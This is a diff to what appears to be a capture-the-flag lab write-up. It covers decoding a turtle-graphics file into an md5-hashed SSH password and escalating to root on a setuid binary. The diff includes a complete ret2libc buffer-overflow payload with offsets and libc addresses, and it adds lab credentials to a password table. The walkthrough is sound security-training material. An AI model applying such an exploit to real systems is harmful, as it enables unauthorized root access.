@@ -474,6 +474,50 @@ We can now login as thor:
 `su thor`
 `> Password: Publicspeakingisveryeasy.126241207201b2149opekmq426135`
 
+
+## SSH thor - Break turtle file
+
+We have a file called turtle, with some weird instructions:
+
+`Tourne gauche de 90 degrees`
+`Avance 50 spaces`
+`...`
+
+After googling turtle language, we understand that it is used to draw some logos or even some text.
+Now we will have to translate the 1471 lines of the turtle files into real turtle instructions.
+We made a script to do so [breakTurtle.sh](scripts/levels/turtle/breakTurtle.sh)
+
+Once it is done, it creates a file that can be interpreted as python, we can use this website
+to visualize the result: https://repl.it/@RaphalT/DefiantIdealisticDifferences#main.py
+
+It draws these letters: S L A S H
+
+Once hashed in md5 as the original turtle file suggested,
+we obtain zaz's ssh password: 646da671ca01bb5d84dbb5fb2238dc8e
+
+`su zaz`
+`> Password: 646da671ca01bb5d84dbb5fb2238dc8e`
+
+## SSH zaz - The buffer overflow ending
+
+We have a file with an explicit name: `exploit_me`
+It has the root suid, we understand that we're almost done.
+
+exploit_me contains a buffer overflow vulnerability on argv[1]
+First we find the offset using a pattern, and we can see that the offset is 140 bytes.
+
+Now we can use a ret2libc:
+1: find func system address => `print system` => 0xb7e6b060
+2: find "/bin/sh" string => `find &system,+9999999,"/bin/sh"` => 0xb7f8cc58
+3: EXPLOIT
+
+140 padding, then system address followed by 4 random bytes for the RET address and finally the "/bin/sh" parameter
+
+`./exploit_me $(python -c 'print "A" * 140 + "\x60\xb0\xe6\xb7" + "A" *4 + "\x58\xcc\xf8\xb7"')`
+`# whoami`
+`root`
+
+
 ---
 
 ## Passwords
@@ -486,6 +530,7 @@ We can now login as thor:
 | ftp            | `lmezard`              | `G!@M6f4Eatau{sF"`                                                 |
 | ssh            | `laurie`               | `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` |
 | ssh            | `thor`                 | `Publicspeakingisveryeasy.126241207201b2149opekmq426135`           |
+| ssh            | `zaz`                  | `646da671ca01bb5d84dbb5fb2238dc8e`                                 |
 
 ## Sources
 
